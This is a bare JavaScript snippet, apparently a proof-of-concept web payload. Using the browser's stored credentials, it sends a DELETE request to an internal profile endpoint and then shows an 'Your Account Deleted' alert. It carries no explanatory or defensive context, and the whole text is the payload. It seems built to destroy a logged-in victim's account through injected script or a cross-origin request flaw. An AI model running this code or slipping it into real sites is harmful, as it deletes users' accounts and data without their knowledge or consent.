const xhr = new XMLHttpRequest();
xhr.open('DELETE', '/user/api/internal/profile', true);
xhr.withCredentials = true;

xhr.onload = function () {
  alert('Your Account Deleted');
};

xhr.send();
